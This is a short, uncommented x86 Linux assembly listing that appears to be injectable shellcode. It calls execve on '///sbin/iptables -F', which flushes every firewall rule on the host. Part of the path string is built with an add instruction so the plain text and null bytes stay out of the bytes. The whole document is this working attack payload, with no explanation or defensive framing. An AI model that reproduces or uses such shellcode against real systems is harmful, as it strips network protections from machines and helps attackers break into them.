global _start

_start:
xor eax,eax
push eax
push dword 0x73656c62
push dword 0x61747069
push dword 0x2f6e6962
mov edx, 0x11111111
add edx, 0x621e1e1e
push edx
mov ebx, esp
push eax
push word 0x462d
mov esi, esp
push eax
push esi
push ebx
mov ecx,esp
mov edx,eax
mov al,0xa
inc al
int 0x80
